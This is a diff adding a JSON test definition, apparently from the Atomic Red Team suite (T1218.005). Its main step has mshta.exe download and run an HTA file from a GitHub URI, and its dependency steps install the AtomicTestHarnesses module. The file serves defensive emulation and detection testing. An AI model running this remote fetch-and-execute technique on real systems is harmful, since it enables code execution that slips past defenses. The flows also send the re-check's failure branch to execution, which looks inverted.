@@ -1,0 +1,92 @@
+{
+  "id": "39ceed55-f653-48ac-bd19-aceceaf525db",
+  "name": "Invoke HTML Application - Direct download from URI",
+  "description": "Executes an HTA Application by directly downloading from remote URI.",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "43021251-93f5-40d9-a6ac-078b31e61d6b",
+      "type": "execute-command",
+      "data": {
+        "command": "Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c1d4832c-e994-47f1-b439-65be89faffb3",
+      "name": "Check dependency 1/1",
+      "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
+      "type": "execute-command",
+      "data": {
+        "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d3d75a83-2b1a-4eeb-a8c5-d54e87b28815",
+      "name": "Resolve dependency 1/1",
+      "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e72fd205-f5a7-4c46-8c67-5f84d3604cbf",
+      "name": "Re-check dependency 1/1",
+      "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
+      "type": "execute-command",
+      "data": {
+        "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "c1d4832c-e994-47f1-b439-65be89faffb3",
+      "p": "on-success",
+      "o": "43021251-93f5-40d9-a6ac-078b31e61d6b"
+    },
+    {
+      "s": "c1d4832c-e994-47f1-b439-65be89faffb3",
+      "p": "on-failure",
+      "o": "d3d75a83-2b1a-4eeb-a8c5-d54e87b28815"
+    },
+    {
+      "s": "d3d75a83-2b1a-4eeb-a8c5-d54e87b28815",
+      "p": "on-success",
+      "o": "e72fd205-f5a7-4c46-8c67-5f84d3604cbf"
+    },
+    {
+      "s": "e72fd205-f5a7-4c46-8c67-5f84d3604cbf",
+      "p": "on-failure",
+      "o": "43021251-93f5-40d9-a6ac-078b31e61d6b"
+    }
+  ],
+  "tags": [
+    "T1218.005",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "mshta_file_path",
+      "type": "string",
+      "description": "Location of mshta.exe",
+      "value": "$env:windir\\system32\\mshta.exe"
+    },
+    {
+      "name": "hta_uri",
+      "type": "url",
+      "description": "URI to HTA",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"
+    }
+  ]
+}
